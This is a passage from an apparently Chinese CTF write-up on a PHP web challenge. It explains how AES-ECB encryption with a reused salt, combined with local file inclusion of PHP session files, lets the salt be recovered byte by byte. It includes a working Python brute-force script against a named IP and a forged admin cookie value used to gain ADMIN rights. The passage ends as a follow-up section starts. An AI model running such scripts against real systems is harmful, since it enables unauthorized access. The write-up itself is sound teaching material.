</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-5-7><a style=outline:none;text-decoration:none;color:inherit href=#hl-5-7> 7</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-5-8><a style=outline:none;text-decoration:none;color:inherit href=#hl-5-8> 8</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-5-9><a style=outline:none;text-decoration:none;color:inherit href=#hl-5-9> 9</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-5-10><a style=outline:none;text-decoration:none;color:inherit href=#hl-5-10>10</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-5-11><a style=outline:none;text-decoration:none;color:inherit href=#hl-5-11>11</a>
</span></code></pre></td><td style=vertical-align:top;padding:0;margin:0;border:0;width:100%><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-php data-lang=php><span style=display:flex><span><span style=color:#66d9ef>if</span>(<span style=color:#a6e22e>strlen</span>($_POST[<span style=color:#e6db74>&#39;name&#39;</span>])<span style=color:#f92672>&lt;=</span><span style=color:#ae81ff>22</span>){
</span></span><span style=display:flex><span>    $name<span style=color:#f92672>=</span><span style=color:#a6e22e>mysqli_real_escape_string</span>($conn,$_POST[<span style=color:#e6db74>&#39;name&#39;</span>]);
</span></span><span style=display:flex><span>    $query<span style=color:#f92672>=</span><span style=color:#e6db74>&#34;UPDATE users SET userName=&#39;</span><span style=color:#e6db74>$name</span><span style=color:#e6db74>&#39; WHERE userEmail=&#39;</span><span style=color:#e6db74>$mail</span><span style=color:#e6db74>&#39;&#34;</span>;
</span></span><span style=display:flex><span>    $res2<span style=color:#f92672>=</span><span style=color:#a6e22e>mysqli_query</span>($conn,$query);
</span></span><span style=display:flex><span>    $userRow2<span style=color:#f92672>=</span><span style=color:#a6e22e>mysqli_fetch_array</span>($res2);
</span></span><span style=display:flex><span>    $secure_name<span style=color:#f92672>=</span><span style=color:#a6e22e>encryptData</span>($name,$salt,$key);
</span></span><span style=display:flex><span>    $_SESSION[<span style=color:#e6db74>&#39;character_name&#39;</span>] <span style=color:#f92672>=</span> $secure_name;
</span></span><span style=display:flex><span>    $log_content<span style=color:#f92672>=</span><span style=color:#e6db74>&#39;[&#39;</span><span style=color:#f92672>.</span><span style=color:#a6e22e>date</span>(<span style=color:#e6db74>&#34;h:i:sa&#34;</span>)<span style=color:#f92672>.</span><span style=color:#e6db74>&#39; GMT+7] Change character name&#39;</span>;
</span></span><span style=display:flex><span>    $_SESSION[<span style=color:#e6db74>&#39;action&#39;</span>]<span style=color:#f92672>=</span>$log_content;
</span></span><span style=display:flex><span>    <span style=color:#a6e22e>header</span>(<span style=color:#e6db74>&#34;Refresh:0&#34;</span>);
</span></span><span style=display:flex><span>}
</span></span></code></pre></td></tr></table></div></div><p>所有加密操作用的是同一个<code>$salt</code> ，加上上述包含Session文件的操作，就会有构造任意明文获取对应密文的可能。最重要的，加密方式采用了<code>AES-128-ECB</code> ，<code>ECB</code> 全称<code>Electronic Codebook</code> （电码本），顾名思义，这种模式的特点就是相同的明文块加密后会得到相同的密文块。</p><p>这里采用128位的分组形式，也就是每十六字节一个明文块。举栗说明：</p><p>如果用户名是<code>findneo</code> 七个字节，<code>$salt</code> 是<code>xianzhi</code> 八个字节，那么加密过程就是把<code>findneoxianzhi</code> 共十五个字节作为一个分组去加密，缺一个字节按算法padding。</p><p>如果用户名是<code>hifindneo</code> 共九个字节，那么加密过程就是对<code>hifindne</code> 和<code>oxianzhi</code> 作为两个分组加密。</p><p>我们可以在<code>SETTING</code> 页面修改用户名来改变明文，然后使用文件包含读到Session文件内容来获取密文，这就是一个完整的选择明文攻击过程。</p><h2 id=利用>利用<a hidden class=anchor aria-hidden=true href=#利用>#</a></h2><p>怎么攻击呢？比如用户名是<code>findneo</code> ，（我们还不知道<code>$salt</code> 是<code>xianzhi</code> ） ，那么加密的第一个明文分组是<code>findneox</code> ，记录下<code>$_SESSION['character_name']</code> 的前32个字节十六进制数，也就是密文的第一个分组。</p><p>然后依次改变用户名为<code>findneoa</code> 、<code>findneob</code> 、.etc，并记录密文第一个分组。直到用户名为<code>findneox</code> 时发现密文第一个分组与用户名为<code>findneo</code> 时的相同。根据ECB模式的特点，就能知道<code>$salt</code> 的第一个字节为<code>x</code> ，事实上也确实如此。</p><p>测试发现用户名长15个字符时，<code>$_SESSION['character_name']</code> 有64字节十六进制数，也就是加盐加密后是32个字符，用户名长为16个字符时，<code>$_SESSION['character_name']</code> 有96字节，也就加盐加密后有48个字符。这说明<code>$salt</code> 长为16个字节。</p><p>然后就可以按照以上原理猜解<code>$salt</code> ，伪造<code>$_COOKIE['_role']</code> ，成为管理员。</p><div class=highlight><div style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><table style=border-spacing:0;padding:0;margin:0;border:0><tr><td style=vertical-align:top;padding:0;margin:0;border:0><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-6-1><a style=outline:none;text-decoration:none;color:inherit href=#hl-6-1> 1</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-6-2><a style=outline:none;text-decoration:none;color:inherit href=#hl-6-2> 2</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-6-3><a style=outline:none;text-decoration:none;color:inherit href=#hl-6-3> 3</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-6-4><a style=outline:none;text-decoration:none;color:inherit href=#hl-6-4> 4</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-6-5><a style=outline:none;text-decoration:none;color:inherit href=#hl-6-5> 5</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-6-6><a style=outline:none;text-decoration:none;color:inherit href=#hl-6-6> 6</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-6-7><a style=outline:none;text-decoration:none;color:inherit href=#hl-6-7> 7</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-6-8><a style=outline:none;text-decoration:none;color:inherit href=#hl-6-8> 8</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-6-9><a style=outline:none;text-decoration:none;color:inherit href=#hl-6-9> 9</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-6-10><a style=outline:none;text-decoration:none;color:inherit href=#hl-6-10>10</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-6-11><a style=outline:none;text-decoration:none;color:inherit href=#hl-6-11>11</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-6-12><a style=outline:none;text-decoration:none;color:inherit href=#hl-6-12>12</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-6-13><a style=outline:none;text-decoration:none;color:inherit href=#hl-6-13>13</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-6-14><a style=outline:none;text-decoration:none;color:inherit href=#hl-6-14>14</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-6-15><a style=outline:none;text-decoration:none;color:inherit href=#hl-6-15>15</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-6-16><a style=outline:none;text-decoration:none;color:inherit href=#hl-6-16>16</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-6-17><a style=outline:none;text-decoration:none;color:inherit href=#hl-6-17>17</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-6-18><a style=outline:none;text-decoration:none;color:inherit href=#hl-6-18>18</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-6-19><a style=outline:none;text-decoration:none;color:inherit href=#hl-6-19>19</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-6-20><a style=outline:none;text-decoration:none;color:inherit href=#hl-6-20>20</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-6-21><a style=outline:none;text-decoration:none;color:inherit href=#hl-6-21>21</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-6-22><a style=outline:none;text-decoration:none;color:inherit href=#hl-6-22>22</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-6-23><a style=outline:none;text-decoration:none;color:inherit href=#hl-6-23>23</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-6-24><a style=outline:none;text-decoration:none;color:inherit href=#hl-6-24>24</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-6-25><a style=outline:none;text-decoration:none;color:inherit href=#hl-6-25>25</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-6-26><a style=outline:none;text-decoration:none;color:inherit href=#hl-6-26>26</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-6-27><a style=outline:none;text-decoration:none;color:inherit href=#hl-6-27>27</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-6-28><a style=outline:none;text-decoration:none;color:inherit href=#hl-6-28>28</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-6-29><a style=outline:none;text-decoration:none;color:inherit href=#hl-6-29>29</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-6-30><a style=outline:none;text-decoration:none;color:inherit href=#hl-6-30>30</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-6-31><a style=outline:none;text-decoration:none;color:inherit href=#hl-6-31>31</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-6-32><a style=outline:none;text-decoration:none;color:inherit href=#hl-6-32>32</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-6-33><a style=outline:none;text-decoration:none;color:inherit href=#hl-6-33>33</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-6-34><a style=outline:none;text-decoration:none;color:inherit href=#hl-6-34>34</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-6-35><a style=outline:none;text-decoration:none;color:inherit href=#hl-6-35>35</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-6-36><a style=outline:none;text-decoration:none;color:inherit href=#hl-6-36>36</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-6-37><a style=outline:none;text-decoration:none;color:inherit href=#hl-6-37>37</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-6-38><a style=outline:none;text-decoration:none;color:inherit href=#hl-6-38>38</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-6-39><a style=outline:none;text-decoration:none;color:inherit href=#hl-6-39>39</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-6-40><a style=outline:none;text-decoration:none;color:inherit href=#hl-6-40>40</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-6-41><a style=outline:none;text-decoration:none;color:inherit href=#hl-6-41>41</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-6-42><a style=outline:none;text-decoration:none;color:inherit href=#hl-6-42>42</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-6-43><a style=outline:none;text-decoration:none;color:inherit href=#hl-6-43>43</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-6-44><a style=outline:none;text-decoration:none;color:inherit href=#hl-6-44>44</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-6-45><a style=outline:none;text-decoration:none;color:inherit href=#hl-6-45>45</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-6-46><a style=outline:none;text-decoration:none;color:inherit href=#hl-6-46>46</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-6-47><a style=outline:none;text-decoration:none;color:inherit href=#hl-6-47>47</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-6-48><a style=outline:none;text-decoration:none;color:inherit href=#hl-6-48>48</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-6-49><a style=outline:none;text-decoration:none;color:inherit href=#hl-6-49>49</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-6-50><a style=outline:none;text-decoration:none;color:inherit href=#hl-6-50>50</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-6-51><a style=outline:none;text-decoration:none;color:inherit href=#hl-6-51>51</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-6-52><a style=outline:none;text-decoration:none;color:inherit href=#hl-6-52>52</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-6-53><a style=outline:none;text-decoration:none;color:inherit href=#hl-6-53>53</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-6-54><a style=outline:none;text-decoration:none;color:inherit href=#hl-6-54>54</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-6-55><a style=outline:none;text-decoration:none;color:inherit href=#hl-6-55>55</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-6-56><a style=outline:none;text-decoration:none;color:inherit href=#hl-6-56>56</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-6-57><a style=outline:none;text-decoration:none;color:inherit href=#hl-6-57>57</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-6-58><a style=outline:none;text-decoration:none;color:inherit href=#hl-6-58>58</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-6-59><a style=outline:none;text-decoration:none;color:inherit href=#hl-6-59>59</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-6-60><a style=outline:none;text-decoration:none;color:inherit href=#hl-6-60>60</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-6-61><a style=outline:none;text-decoration:none;color:inherit href=#hl-6-61>61</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-6-62><a style=outline:none;text-decoration:none;color:inherit href=#hl-6-62>62</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-6-63><a style=outline:none;text-decoration:none;color:inherit href=#hl-6-63>63</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-6-64><a style=outline:none;text-decoration:none;color:inherit href=#hl-6-64>64</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-6-65><a style=outline:none;text-decoration:none;color:inherit href=#hl-6-65>65</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-6-66><a style=outline:none;text-decoration:none;color:inherit href=#hl-6-66>66</a>
</span></code></pre></td><td style=vertical-align:top;padding:0;margin:0;border:0;width:100%><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-python data-lang=python><span style=display:flex><span><span style=color:#75715e># -*- coding: utf-8 -*-</span>
</span></span><span style=display:flex><span><span style=color:#75715e># by https://findneo.github.io/</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#f92672>import</span> requests
</span></span><span style=display:flex><span><span style=color:#f92672>from</span> bs4 <span style=color:#f92672>import</span> BeautifulSoup
</span></span><span style=display:flex><span><span style=color:#f92672>import</span> string
</span></span><span style=display:flex><span><span style=color:#f92672>import</span> hashlib
</span></span><span style=display:flex><span>url <span style=color:#f92672>=</span> <span style=color:#e6db74>&#34;http://178.128.87.16/&#34;</span>
</span></span><span style=display:flex><span>cookie <span style=color:#f92672>=</span> dict(
</span></span><span style=display:flex><span>    PHPSESSID<span style=color:#f92672>=</span><span style=color:#e6db74>&#39;t9p07a1qt2plbcqp8tpkib4794&#39;</span>,
</span></span><span style=display:flex><span>    <span style=color:#75715e># _role=&#39;8e1c59c3fdd69afbc97fcf4c960aa5c5e919e7087c07c91cf690add608236cbe&#39;</span>
</span></span><span style=display:flex><span>)
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#66d9ef>def</span> <span style=color:#a6e22e>read_sess</span>():
</span></span><span style=display:flex><span>    r <span style=color:#f92672>=</span> requests<span style=color:#f92672>.</span>get(
</span></span><span style=display:flex><span>        url <span style=color:#f92672>+</span> <span style=color:#e6db74>&#34;?page=/var/lib/php/sessions/sess_&#34;</span> <span style=color:#f92672>+</span> cookie[<span style=color:#e6db74>&#39;PHPSESSID&#39;</span>],
</span></span><span style=display:flex><span>        cookies<span style=color:#f92672>=</span>cookie)
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>return</span> r<span style=color:#f92672>.</span>content
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#66d9ef>def</span> <span style=color:#a6e22e>get_sess_character_name</span>():
</span></span><span style=display:flex><span>    <span style=color:#e6db74>&#34;&#34;&#34;read_sess():
</span></span></span><span style=display:flex><span><span style=color:#e6db74>    character_name|s:64:&#34;6269cb047bbbd0802cd7b882700591c6f6ace10234be4243997282e7c467e820&#34;;
</span></span></span><span style=display:flex><span><span style=color:#e6db74>    user|s:64:&#34;82f0cac5c0591592eaccfdac48f3e3656c264c7a73f97aeea603461254e3ac38&#34;;
</span></span></span><span style=display:flex><span><span style=color:#e6db74>    action|s:40:&#34;[12:04:21pm GMT+7] Change character name&#34;;
</span></span></span><span style=display:flex><span><span style=color:#e6db74>    &#34;&#34;&#34;</span>
</span></span><span style=display:flex><span>    character_name <span style=color:#f92672>=</span> read_sess()<span style=color:#f92672>.</span>split(<span style=color:#e6db74>&#39;;&#39;</span>)[<span style=color:#ae81ff>0</span>]<span style=color:#f92672>.</span>split(<span style=color:#e6db74>&#34;:&#34;</span>)[<span style=color:#f92672>-</span><span style=color:#ae81ff>1</span>][<span style=color:#ae81ff>1</span>:<span style=color:#f92672>-</span><span style=color:#ae81ff>1</span>]
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>return</span> character_name
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#66d9ef>def</span> <span style=color:#a6e22e>change_name</span>(character_name):
</span></span><span style=display:flex><span>    payload <span style=color:#f92672>=</span> dict(name<span style=color:#f92672>=</span>character_name, submit<span style=color:#f92672>=</span><span style=color:#e6db74>&#39;Edit&#39;</span>)
</span></span><span style=display:flex><span>    r <span style=color:#f92672>=</span> requests<span style=color:#f92672>.</span>post(url <span style=color:#f92672>+</span> <span style=color:#e6db74>&#34;?page=setting.php&#34;</span>, cookies<span style=color:#f92672>=</span>cookie, data<span style=color:#f92672>=</span>payload)
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#66d9ef>def</span> <span style=color:#a6e22e>whoami</span>():
</span></span><span style=display:flex><span>    r <span style=color:#f92672>=</span> requests<span style=color:#f92672>.</span>get(url <span style=color:#f92672>+</span> <span style=color:#e6db74>&#34;?page=home.php&#34;</span>, cookies<span style=color:#f92672>=</span>cookie)
</span></span><span style=display:flex><span>    s <span style=color:#f92672>=</span> BeautifulSoup(r<span style=color:#f92672>.</span>content, <span style=color:#e6db74>&#39;lxml&#39;</span>)
</span></span><span style=display:flex><span>    print s<span style=color:#f92672>.</span>h2<span style=color:#f92672>.</span>get_text()<span style=color:#f92672>.</span>split(<span style=color:#e6db74>&#39;</span><span style=color:#ae81ff>\n</span><span style=color:#e6db74>&#39;</span>)[<span style=color:#ae81ff>0</span>]
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#66d9ef>def</span> <span style=color:#a6e22e>change_and_check</span>(name):
</span></span><span style=display:flex><span>    change_name(name)
</span></span><span style=display:flex><span>    <span style=color:#75715e># whoami()</span>
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>return</span> get_sess_character_name()
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#66d9ef>def</span> <span style=color:#a6e22e>crack_salt</span>():
</span></span><span style=display:flex><span>    junk <span style=color:#f92672>=</span> <span style=color:#e6db74>&#39;x&#39;</span> <span style=color:#f92672>*</span> <span style=color:#ae81ff>16</span>
</span></span><span style=display:flex><span>    salt <span style=color:#f92672>=</span> <span style=color:#e6db74>&#39;&#39;</span>
</span></span><span style=display:flex><span>    s <span style=color:#f92672>=</span> <span style=color:#e6db74>&#39;ms_g00d_0ld_g4m3&#39;</span> <span style=color:#f92672>+</span> string<span style=color:#f92672>.</span>printable
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>for</span> i <span style=color:#f92672>in</span> range(<span style=color:#ae81ff>15</span>, <span style=color:#f92672>-</span><span style=color:#ae81ff>1</span>, <span style=color:#f92672>-</span><span style=color:#ae81ff>1</span>):
</span></span><span style=display:flex><span>        cmp <span style=color:#f92672>=</span> change_and_check(junk[:i])[:<span style=color:#ae81ff>32</span>]
</span></span><span style=display:flex><span>        <span style=color:#66d9ef>if</span> i <span style=color:#f92672>==</span> <span style=color:#ae81ff>0</span>:
</span></span><span style=display:flex><span>            <span style=color:#75715e># 如果i==0，无法修改用户名，实际上salt对应的就是第二个密文块，直接取即可</span>
</span></span><span style=display:flex><span>            cmp <span style=color:#f92672>=</span> change_and_check(junk)[<span style=color:#ae81ff>32</span>:<span style=color:#ae81ff>64</span>]
</span></span><span style=display:flex><span>        <span style=color:#66d9ef>for</span> j <span style=color:#f92672>in</span> s:
</span></span><span style=display:flex><span>            <span style=color:#66d9ef>if</span> cmp <span style=color:#f92672>==</span> change_and_check(junk[:i] <span style=color:#f92672>+</span> salt <span style=color:#f92672>+</span> j)[:<span style=color:#ae81ff>32</span>]:
</span></span><span style=display:flex><span>                salt <span style=color:#f92672>+=</span> j
</span></span><span style=display:flex><span>                print salt
</span></span><span style=display:flex><span>                <span style=color:#66d9ef>break</span>
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>return</span> salt
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>salt <span style=color:#f92672>=</span> crack_salt()
</span></span></code></pre></td></tr></table></div></div><p>爆破得到<code>$salt</code> 为<code>ms_g00d_0ld_g4m3</code> ，然后计算出<code>admin</code> 用户的Cookie为<code> hashlib.sha256('admin' + salt).hexdigest()</code> 也就是<code>_role='a2ae9db7fd12a8911be74590b99bc7ad1f2f6ccd2e68e44afbf1280349205054' </code>。</p><p><img loading=lazy src=08d4082f356716a6d.png alt></p><p>可使用Fiddler的Filters功能设置请求头为<code>PHPSESSID=8es749ivbfetvsmsc0ggthr2e5; _role=8e1c59c3fdd69afbc97fcf4c960aa5c5e919e7087c07c91cf690add608236cbe</code> ，权限上升为ADMIN。</p><p><img loading=lazy src=c84fb1c96ff652fc9.png alt></p><h1 id=以cookie为跳板的session文件包含>以Cookie为跳板的Session文件包含<a hidden class=anchor aria-hidden=true href=#以cookie为跳板的session文件包含>#</a></h1><h2 id=adminphp>admin.php<a hidden class=anchor aria-hidden=true href=#adminphp>#</a></h2><p>注意到Session文件中有部分明文信息，记录关于上一次的操作。每一次操作都会记录，但只有<code>admin.php</code> 中写入的内容存在可控变量：</p><div class=highlight><div style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><table style=border-spacing:0;padding:0;margin:0;border:0><tr><td style=vertical-align:top;padding:0;margin:0;border:0><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-7-1><a style=outline:none;text-decoration:none;color:inherit href=#hl-7-1> 1</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-7-2><a style=outline:none;text-decoration:none;color:inherit href=#hl-7-2> 2</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-7-3><a style=outline:none;text-decoration:none;color:inherit href=#hl-7-3> 3</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-7-4><a style=outline:none;text-decoration:none;color:inherit href=#hl-7-4> 4</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-7-5><a style=outline:none;text-decoration:none;color:inherit href=#hl-7-5> 5</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-7-6><a style=outline:none;text-decoration:none;color:inherit href=#hl-7-6> 6</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-7-7><a style=outline:none;text-decoration:none;color:inherit href=#hl-7-7> 7</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-7-8><a style=outline:none;text-decoration:none;color:inherit href=#hl-7-8> 8</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-7-9><a style=outline:none;text-decoration:none;color:inherit href=#hl-7-9> 9</a>
